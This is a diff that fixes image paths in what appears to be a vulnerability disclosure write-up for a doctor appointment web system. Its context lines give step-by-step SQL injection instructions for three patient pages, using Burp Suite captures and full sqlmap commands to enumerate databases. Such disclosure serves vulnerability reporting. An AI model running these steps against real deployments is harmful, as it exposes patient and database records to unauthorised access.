@@ -22,25 +22,25 @@ Visit http://ip/patient/doctors.php  ,  will access the page of the module.
 
 Use burp suite to capture request packet , and then click the View button.
 
-![image-20220718142415157](.\img\image-20220718142415157.png)
+![image-20220718142415157](./img/image-20220718142415157.png)
 
 
 
-![image-20220718142655610](.\img\image-20220718142655610.png)
+![image-20220718142655610](./img/image-20220718142655610.png)
 
 
 
 Copy request packet to sqlmap root path , and revise id=1*  , save as 2.txt.
 
-![image-20220718143251333](.\img\image-20220718143251333.png)
+![image-20220718143251333](./img/image-20220718143251333.png)
 
 
 
 Use `python sqlmap.py -r 2.txt --threads 10 --batch --level 3 --risk 3 --dbms mysql --technique B --dbs`  to run sqlmap.
 
-![image-20220718150104521](.\img\image-20220718150104521.png)
+![image-20220718150104521](./img/image-20220718150104521.png)
 
-![image-20220718143826189](.\img\image-20220718143826189.png)
+![image-20220718143826189](./img/image-20220718143826189.png)
 
 
 
@@ -84,21 +84,21 @@ Log in to the http://ip/login.php
 
 First , visit http://ip/patient/schedule.php , and then use burpsuite to capture request packet , click Book Now button.
 
-![image-20220718144354012](.\img\image-20220718144354012.png)
+![image-20220718144354012](./img/image-20220718144354012.png)
 
 
 
-![image-20220718144910131](.\img\image-20220718144910131.png)
+![image-20220718144910131](./img/image-20220718144910131.png)
 
 
 
 Copy request packet to sqlmap root path , and revise id=1*  , save as 2.txt.
 
-![image-20220718145003623](.\img\image-20220718145003623.png)
+![image-20220718145003623](./img/image-20220718145003623.png)
 
 Use `python sqlmap.py -r 2.txt --threads 10 --batch --level 3 --risk 3 --dbms mysql --dbs`  to run sqlmap.
 
-![image-20220718150315609](D:\Pyproject\cve\bug_e\edoc-doctor-appointment-system\img\image-20220718150315609.png)
+![image-20220718150315609](D:/Pyproject/cve\bug_e\edoc-doctor-appointment-system\img\image-20220718150315609.png)
 
 
 
@@ -146,16 +146,16 @@ Log in to the http://ip/login.php
 
 First , visit http://ip/patient/settings.php , and then use burpsuite to capture request packet , click Book Now button.
 
-![image-20220718150601739](.\img\image-20220718150601739.png)
+![image-20220718150601739](./img/image-20220718150601739.png)
 
 
 
-![image-20220718150651966](.\img\image-20220718150651966.png)
+![image-20220718150651966](./img/image-20220718150651966.png)
 
 Copy request packet to sqlmap root path , and revise id=1*  , save as 2.txt.
 
-![image-20220718150822191](.\img\image-20220718150822191.png)
+![image-20220718150822191](./img/image-20220718150822191.png)
 
 Use `python sqlmap.py -r 2.txt --threads 10 --batch --level 3 --risk 3 --dbms mysql --dbs`  to run sqlmap.
 
-![image-20220718151328691](.\img\image-20220718151328691.png)
+![image-20220718151328691](./img/image-20220718151328691.png)
